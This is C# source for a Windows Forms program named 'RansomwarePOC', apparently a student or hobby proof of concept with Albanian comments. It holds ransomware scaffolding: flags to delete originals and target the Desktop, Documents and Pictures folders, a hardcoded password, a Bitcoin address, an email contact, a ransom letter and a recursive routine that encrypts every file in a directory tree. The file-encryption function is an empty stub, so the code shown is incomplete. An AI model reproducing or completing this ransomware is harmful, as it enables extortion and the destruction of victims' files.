using System;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace RansomwarePOC
{
    public partial class Form1 : Form
    {
        //partial class-e ndan klasen n disa fajlla e kur e kompajllon i bashkon krejt ne nje funksionalitet

        private const bool DELETE_ALL_ORIGINALS = true; /* CAUTION */
        private const bool ENCRYPT_DESKTOP = false;
        private const bool ENCRYPT_DOCUMENTS = false;
        private const bool ENCRYPT_PICTURES = false;
        private const bool ENCRYPT_FOLDER = true;
        private const string ENCRYPTED_FILE_EXTENSION = ".jcrypt";
        private const string ENCRYPT_PASSWORD = "Password1";
        private const string BITCOIN_ADDRESS = "1BtUL5dhVXHwKLqSdhjyjK9Pe64Vc6CEH1";
        private const string BITCOIN_RANSOM_AMOUNT = "1";
        private const string EMAIL_ADDRESS = "this.email.address@gmail.com";

        private static string ENCRYPTION_LOG = "";
        private string RANSOM_LETTER =
           "All of your files have been encrypted.\n\n" +
           "To unlock them, please send " + BITCOIN_RANSOM_AMOUNT + " bitcoin(s) to BTC address: " + BITCOIN_ADDRESS + "\n" +
           "Afterwards, please email your transaction ID to: " + EMAIL_ADDRESS + "\n\n" +
           "Thank you and have a nice day!\n\n" +
           "Encryption Log:\n" +
           "----------------------------------------\n";
        private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        private string RANDOM_FOLDER = "C:/Users/Amigos/Desktop/random"; //Path i vecant per secilin
        private static int encryptedFileCount = 0;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }
        static void encryptFolderContents(string sDir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(sDir))
                {
                    if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
                    {
                        Console.Out.WriteLine("Encrypting: " + f);
                        FileEncrypt(f, ENCRYPT_PASSWORD);
                    }
                }

                foreach (string d in Directory.GetDirectories(sDir))
                {
                    encryptFolderContents(d);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }
        private static void FileEncrypt(string inputFile, string password)
        {
           
        }

    }
}
